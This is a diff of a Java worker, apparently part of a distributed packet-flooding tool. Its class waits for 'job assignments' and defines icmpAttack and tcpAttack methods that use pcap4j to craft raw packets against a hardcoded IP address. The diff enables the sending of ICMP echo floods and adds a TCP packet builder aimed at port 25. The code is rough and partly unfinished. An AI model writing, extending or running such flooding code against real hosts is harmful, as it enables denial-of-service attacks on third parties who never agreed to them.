@@ -9,8 +9,6 @@ import org.pcap4j.util.MacAddress;
 import java.io.*;
 import java.net.*;
 
-import java.nio.charset.StandardCharsets;
-
 
 public class Jobseeker{
 
@@ -38,9 +36,9 @@ public class Jobseeker{
 
                 // testing block .. beginning
                 String targetIP = "99.243.74.247";
-                icmpAttack(targetIP);
+                //icmpAttack(targetIP);
                 // - - - - - - - - - - -
-                //tcpAttack(targetIP);
+                tcpAttack(targetIP, 25);
                 //testing block .. end
                 // JOB ASSIGNMENTS
                 System.out.println("Waiting for job assignments...");
@@ -146,8 +144,7 @@ public class Jobseeker{
             NetworkInterface ni = NetworkInterface.getByInetAddress(targetAddress);
             NetworkInterface niLocal = NetworkInterface.getByInetAddress(localhost);
 
-//            byte[] mac = ni.getHardwareAddress();
-//            System.out.println("Mac length is: "+ ni.getHardwareAddress());
+
             byte[] mac = niLocal.getHardwareAddress();
             System.out.println("Garbage: "+mac.toString());
             MacAddress sourceMac = MacAddress.getByAddress(niLocal.getHardwareAddress());
@@ -197,7 +194,8 @@ public class Jobseeker{
                 System.out.println("****************");
                 System.out.println("Sending Echo request Packets");
                 System.out.println("****************");
-                //handler.sendPacket(data);
+                //comment line below to execute on Windows
+                handler.sendPacket(data);
             }
 
             EthernetPacket.Builder ethernet = new EthernetPacket.Builder();
@@ -215,7 +213,6 @@ public class Jobseeker{
             handler.loop(40, packetlistener);
 
             System.out.println(stat.getNumPacketsCaptured());
-
         }
         catch (Exception p){
             p.printStackTrace();
@@ -231,8 +228,45 @@ public class Jobseeker{
         return mac;
     }
 
-    public static void tcpAttack(String target){
+    public static void tcpAttack(String target, int port){
+        PcapHandle handler;
         System.out.println("Connection port: "+socket.getLocalPort());
+        int localPort = socket.getLocalPort();
+        byte[] data = new byte[900];
+        for(int i=0; i < data.length; i++){
+            data[i] = (byte) i;
+        }
+
+        try {
+            InetAddress targetAddress = InetAddress.getByName(target);
+            InetAddress localhost = InetAddress.getLocalHost();
+
+            TcpPacket.Builder tcpPacket = new TcpPacket.Builder();
+            tcpPacket.payloadBuilder(new UnknownPacket.Builder().rawData(data));
+            tcpPacket.srcAddr(localhost);
+            tcpPacket.dstAddr(targetAddress);
+            tcpPacket.srcPort(TcpPort.getInstance((short)localPort));
+            tcpPacket.dstPort(TcpPort.getInstance((short) port));
+            tcpPacket.correctLengthAtBuild(true);
+            tcpPacket.correctChecksumAtBuild(true);
+
+            IpV4Packet.Builder ipV4PacketBuilder = new IpV4Packet.Builder();
+            ipV4PacketBuilder.payloadBuilder(tcpPacket);
+            ipV4PacketBuilder.version(IpVersion.IPV4);
+            ipV4PacketBuilder.tos((IpV4Packet.IpV4Tos) () -> (byte) 0);
+            ipV4PacketBuilder.protocol(IpNumber.TCP);
+            ipV4PacketBuilder.srcAddr((Inet4Address) localhost);
+            ipV4PacketBuilder.dstAddr((Inet4Address) targetAddress);
+            ipV4PacketBuilder.correctLengthAtBuild(true);
+            ipV4PacketBuilder.correctChecksumAtBuild(true);
+
+            IpV4Packet ipV4Packet = ipV4PacketBuilder.build();
+            data = ipV4Packet.getRawData();
+            System.out.println("New packet: "+IpV4Packet.newPacket(data,0,data.length));
+
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
     }
 
 }
